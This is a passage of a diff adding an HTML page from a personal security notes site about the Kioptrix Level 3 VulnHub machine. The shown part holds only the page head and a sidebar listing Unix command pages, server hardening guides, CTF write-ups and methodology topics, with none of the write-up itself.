@@ -1,0 +1,7659 @@
+<!DOCTYPE html>
+<html lang="en" class="js csstransforms3d">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="Hugo 0.74.3" />
+    <meta name="description" content="Notes from Kioptrix level 3 from Vulnhub.">
+<meta name="author" content="Justin Perdok">
+
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+
+    <title>Level 3 :: My notes and snippets</title>
+
+    
+    <link href="/css/nucleus.css" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css" rel="stylesheet">
+    <link href="/css/hybrid.css" rel="stylesheet">
+    <link href="/css/featherlight.min.css" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css" rel="stylesheet">
+    <link href="/css/auto-complete.css" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css" rel="stylesheet">
+    <link href="/css/theme.css" rel="stylesheet">
+    <link href="/css/hugo-theme.css" rel="stylesheet">
+    
+      <link href="/css/theme-darkblue.css" rel="stylesheet">
+    
+    <script src="/js/jquery-3.3.1.min.js"></script>
+
+    <style>
+      :root #header + #content > #left > #rlblock_left{
+          display:none !important;
+      }
+      
+    </style>
+    
+  </head>
+  <body class="" data-url="/notes/ctfs/vulnhub/kioptrix/level3/">
+    <nav id="sidebar" class="">
+
+
+
+  <div id="header-wrapper">
+    <div id="header">
+      <a id="logo" href="https://dev-hugo.justin-p.me/">
+
+</a>
+
+    </div>
+    
+        <div class="searchbox">
+    <label for="search-by"><i class="fas fa-search"></i></label>
+    <input data-search-input id="search-by" type="search" placeholder="Search...">
+    <span data-search-clear=""><i class="fas fa-times"></i></span>
+</div>
+
+<script type="text/javascript" src="/js/lunr.min.js"></script>
+<script type="text/javascript" src="/js/auto-complete.js"></script>
+<script type="text/javascript">
+    
+        var baseurl = "https:\/\/dev-hugo.justin-p.me\/";
+    
+</script>
+<script type="text/javascript" src="/js/search.js"></script>
+
+    
+  </div>
+
+    <div class="highlightable">
+    <ul class="topics">
+
+          
+          
+          
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/commands/" title="Commands" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/commands/">
+          <i class="fas fa-keyboard"></i> Commands
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/commands/unix/" title="Unix" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/commands/unix/">
+          <i class='fab fa-linux'></i> Unix
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/awk/" title="awk" class="dd-item ">
+        <a href="/commands/unix/awk/">
+        <i class="fas fa-terminal"></i> awk
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/base64/" title="base64" class="dd-item ">
+        <a href="/commands/unix/base64/">
+        <i class="fas fa-terminal"></i> base64
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/bzip2/" title="bzip2" class="dd-item ">
+        <a href="/commands/unix/bzip2/">
+        <i class="fas fa-terminal"></i> bzip2
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/cron/" title="cron" class="dd-item ">
+        <a href="/commands/unix/cron/">
+        <i class="fas fa-terminal"></i> cron
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/curl/" title="curl" class="dd-item ">
+        <a href="/commands/unix/curl/">
+        <i class="fas fa-terminal"></i> curl
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/cut/" title="cut" class="dd-item ">
+        <a href="/commands/unix/cut/">
+        <i class="fas fa-terminal"></i> cut
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/file/" title="file" class="dd-item ">
+        <a href="/commands/unix/file/">
+        <i class="fas fa-terminal"></i> file
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/find/" title="find" class="dd-item ">
+        <a href="/commands/unix/find/">
+        <i class="fas fa-terminal"></i> find
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/grep/" title="grep" class="dd-item ">
+        <a href="/commands/unix/grep/">
+        <i class="fas fa-terminal"></i> grep
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/gzip-gunzip-zcat/" title="gzip gunzip zcat" class="dd-item ">
+        <a href="/commands/unix/gzip-gunzip-zcat/">
+        <i class="fas fa-terminal"></i> gzip gunzip zcat
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/md5sum/" title="md5sum" class="dd-item ">
+        <a href="/commands/unix/md5sum/">
+        <i class="fas fa-terminal"></i> md5sum
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/random/" title="random" class="dd-item ">
+        <a href="/commands/unix/random/">
+        <i class="fas fa-terminal"></i> random
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/rev/" title="rev" class="dd-item ">
+        <a href="/commands/unix/rev/">
+        <i class="fas fa-terminal"></i> rev
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/scp/" title="scp" class="dd-item ">
+        <a href="/commands/unix/scp/">
+        <i class="fas fa-terminal"></i> scp
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/sed/" title="sed" class="dd-item ">
+        <a href="/commands/unix/sed/">
+        <i class="fas fa-terminal"></i> sed
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/sort/" title="sort" class="dd-item ">
+        <a href="/commands/unix/sort/">
+        <i class="fas fa-terminal"></i> sort
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/strings/" title="strings" class="dd-item ">
+        <a href="/commands/unix/strings/">
+        <i class="fas fa-terminal"></i> strings
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/tar/" title="tar" class="dd-item ">
+        <a href="/commands/unix/tar/">
+        <i class="fas fa-terminal"></i> tar
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/tmux/" title="tmux" class="dd-item ">
+        <a href="/commands/unix/tmux/">
+        <i class="fas fa-terminal"></i> tmux
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/touch/" title="touch" class="dd-item ">
+        <a href="/commands/unix/touch/">
+        <i class="fas fa-terminal"></i> touch
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/tr/" title="tr" class="dd-item ">
+        <a href="/commands/unix/tr/">
+        <i class="fas fa-terminal"></i> tr
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/uniq/" title="uniq" class="dd-item ">
+        <a href="/commands/unix/uniq/">
+        <i class="fas fa-terminal"></i> uniq
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/commands/unix/xxd/" title="xxd" class="dd-item ">
+        <a href="/commands/unix/xxd/">
+        <i class="fas fa-terminal"></i> xxd
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+          
+          
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/guides/" title="Guides" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/guides/">
+          <i class='fas fa-arrow-alt-circle-right'></i> Guides
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/guides/ubuntu-vps/" title="Ubuntu VPS" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/guides/ubuntu-vps/">
+          <i class='fab fa-ubuntu'></i> Ubuntu VPS
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/00-intro/" title="00. Introduction" class="dd-item ">
+        <a href="/guides/ubuntu-vps/00-intro/">
+        00. Introduction
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/01-users/" title="01. Adding users" class="dd-item ">
+        <a href="/guides/ubuntu-vps/01-users/">
+        01. Adding users
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/02-packges/" title="02. Managing of packages" class="dd-item ">
+        <a href="/guides/ubuntu-vps/02-packges/">
+        02. Managing of packages
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/03-vim/" title="03. File editor: vim" class="dd-item ">
+        <a href="/guides/ubuntu-vps/03-vim/">
+        03. File editor: vim
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/04-ufw/" title="04. UFW" class="dd-item ">
+        <a href="/guides/ubuntu-vps/04-ufw/">
+        04. UFW
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/05-ssh-keys/" title="05. SSH Keys" class="dd-item ">
+        <a href="/guides/ubuntu-vps/05-ssh-keys/">
+        05. SSH Keys
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/06-setup-sshd/" title="06. Setup sshd" class="dd-item ">
+        <a href="/guides/ubuntu-vps/06-setup-sshd/">
+        06. Setup sshd
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/07-unattended-upgrades/" title="07. Unattended Upgrades" class="dd-item ">
+        <a href="/guides/ubuntu-vps/07-unattended-upgrades/">
+        07. Unattended Upgrades
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/08-fail2ban/" title="08. Fail2ban" class="dd-item ">
+        <a href="/guides/ubuntu-vps/08-fail2ban/">
+        08. Fail2ban
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/09-logwatch/" title="09. Logwatch" class="dd-item ">
+        <a href="/guides/ubuntu-vps/09-logwatch/">
+        09. Logwatch
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/guides/ubuntu-vps/10-sysctl-optimization/" title="10. Sysctl Optimization" class="dd-item ">
+        <a href="/guides/ubuntu-vps/10-sysctl-optimization/">
+        10. Sysctl Optimization
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+          
+          
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/" title="Notes" class="dd-item 
+        parent
+        
+        
+        ">
+      <a href="/notes/">
+          <i class='fas fa-book-reader'></i> Notes
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/courses/" title="Courses" class="dd-item ">
+        <a href="/notes/courses/">
+        <i class='fas fa-school'></i> Courses
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/" title="CTFs" class="dd-item 
+        parent
+        
+        
+        ">
+      <a href="/notes/ctfs/">
+          <i class='fas fa-flag'></i> CTFs
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/graficomspoorzoeker/" title="Graficom Spoorzoeker" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/ctfs/graficomspoorzoeker/">
+          <i class='fas fa-folder'></i> Graficom Spoorzoeker
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/graficomspoorzoeker/challanges/" title="Challanges" class="dd-item ">
+        <a href="/notes/ctfs/graficomspoorzoeker/challanges/">
+        <i class='fas fa-question-circle'></i> Challanges
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/graficomspoorzoeker/solutions/" title="Solutions" class="dd-item ">
+        <a href="/notes/ctfs/graficomspoorzoeker/solutions/">
+        <i class='fas fa-check-circle'></i> Solutions
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/htb/" title="HTB" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/ctfs/htb/">
+          <i class='fas fa-folder'></i> HTB
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/bashed/" title="Bashed" class="dd-item ">
+        <a href="/notes/ctfs/htb/bashed/">
+        <i class='fas fa-server'></i> Bashed
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/blue/" title="Blue" class="dd-item ">
+        <a href="/notes/ctfs/htb/blue/">
+        <i class='fas fa-server'></i> Blue
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/devel/" title="Devel" class="dd-item ">
+        <a href="/notes/ctfs/htb/devel/">
+        <i class='fas fa-server'></i> Devel
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/grandpa/" title="Grandpa" class="dd-item ">
+        <a href="/notes/ctfs/htb/grandpa/">
+        <i class='fas fa-server'></i> Grandpa
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/granny/" title="Granny" class="dd-item ">
+        <a href="/notes/ctfs/htb/granny/">
+        <i class='fas fa-server'></i> Granny
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/jerry/" title="Jerry" class="dd-item ">
+        <a href="/notes/ctfs/htb/jerry/">
+        <i class='fas fa-server'></i> Jerry
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/lame/" title="Lame" class="dd-item ">
+        <a href="/notes/ctfs/htb/lame/">
+        <i class='fas fa-server'></i> Lame
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/legacy/" title="Legacy" class="dd-item ">
+        <a href="/notes/ctfs/htb/legacy/">
+        <i class='fas fa-server'></i> Legacy
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/metmon/" title="Netmon" class="dd-item ">
+        <a href="/notes/ctfs/htb/metmon/">
+        <i class='fas fa-server'></i> Netmon
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/nibbles/" title="Nibbles" class="dd-item ">
+        <a href="/notes/ctfs/htb/nibbles/">
+        <i class='fas fa-server'></i> Nibbles
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/htb/optimum/" title="Optimum" class="dd-item ">
+        <a href="/notes/ctfs/htb/optimum/">
+        <i class='fas fa-server'></i> Optimum
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/overthewire/" title="OverTheWire" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/ctfs/overthewire/">
+          <i class="fas fa-folder"></i> OverTheWire
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/overthewire/bandit/" title="Bandit" class="dd-item ">
+        <a href="/notes/ctfs/overthewire/bandit/">
+        <i class="fas fa-layer-group"></i> Bandit
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/overthewire/natasa/" title="Natasa" class="dd-item ">
+        <a href="/notes/ctfs/overthewire/natasa/">
+        <i class="fas fa-layer-group"></i> Natasa
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/vulnhub/" title="VulnHub" class="dd-item 
+        parent
+        
+        
+        ">
+      <a href="/notes/ctfs/vulnhub/">
+          <i class='fas fa-folder'></i> VulnHub
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/fristileaks/" title="Fristileaks" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/fristileaks/">
+        <i class='fas fa-folder'></i> Fristileaks
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/vulnhub/kioptrix/" title="Kioptrix" class="dd-item 
+        parent
+        
+        
+        ">
+      <a href="/notes/ctfs/vulnhub/kioptrix/">
+          <i class='fas fa-folder'></i> Kioptrix
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/kioptrix/level1/" title="Level 1" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/kioptrix/level1/">
+        <i class='fas fa-layer-group'></i> Level 1
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/kioptrix/level2/" title="Level 2" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/kioptrix/level2/">
+        <i class='fas fa-layer-group'></i> Level 2
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/kioptrix/level3/" title="Level 3" class="dd-item active">
+        <a href="/notes/ctfs/vulnhub/kioptrix/level3/">
+        <i class='fas fa-layer-group'></i> Level 3
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/kioptrix/level4/" title="Level 4" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/kioptrix/level4/">
+        <i class='fas fa-layer-group'></i> Level 4
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/pwnlab/" title="Pwnlab" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/pwnlab/">
+        <i class='fas fa-folder'></i> Pwnlab
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/stapler/" title="Stapler" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/stapler/">
+        <i class='fas fa-folder'></i> Stapler
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnhub/vulnix/" title="Vulnix" class="dd-item ">
+        <a href="/notes/ctfs/vulnhub/vulnix/">
+        <i class='fas fa-folder'></i> Vulnix
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/ctfs/vulnserver/" title="Vulnserver" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/ctfs/vulnserver/">
+          <i class='fas fa-folder'></i> Vulnserver
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/ctfs/vulnserver/trun/" title="TRUN" class="dd-item ">
+        <a href="/notes/ctfs/vulnserver/trun/">
+        <i class='fas fa-layer-group'></i> TRUN
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/exploit-development/" title="Exploit Development" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/exploit-development/">
+          <i class='fas fa-biohazard'></i> Exploit Development
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/exploit-development/buffer-overflow/" title="Buffer Overflow" class="dd-item ">
+        <a href="/notes/exploit-development/buffer-overflow/">
+        <i class='fas fa-layer-group'></i> Buffer Overflow
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/" title="Hacking Methodology" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/">
+          <i class='fas fa-road'></i> Hacking Methodology
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/" title="01. Reconnaissance" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/01-reconnaissance/">
+          01. Reconnaissance
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/certificate-transparency-logs/" title="Certificate Transparency Logs" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/certificate-transparency-logs/">
+        Certificate Transparency Logs
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/" title="Credential Gathering" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/">
+        Credential Gathering
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/" title="DNS Recon" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/">
+        DNS Recon
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/user-enumeration/" title="E-Mail Gathering" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/user-enumeration/">
+        E-Mail Gathering
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/" title="Google Dorking" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/">
+        Google Dorking
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/identify-technologies/" title="Identify Technologies" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/identify-technologies/">
+        Identify Technologies
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/misconfigured-cloud-assets/" title="Misconfigured Cloud Assets" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/misconfigured-cloud-assets/">
+        Misconfigured Cloud Assets
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/phising/" title="phising" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/phising/">
+        phising
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/public-key-disclosure/" title="public key disclosure" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/public-key-disclosure/">
+        public key disclosure
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/shodan/" title="Shodan" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/shodan/">
+        Shodan
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/01-reconnaissance/social-media/" title="Social Media" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/01-reconnaissance/social-media/">
+        Social Media
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/" title="02. Scanning and Enumeration" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/">
+          02. Scanning and Enumeration
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/" title="Discover Open Ports" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/">
+        Discover Open Ports
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/" title="Finger" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/">
+        Finger
+        
+        </a>
+    </li>
+     
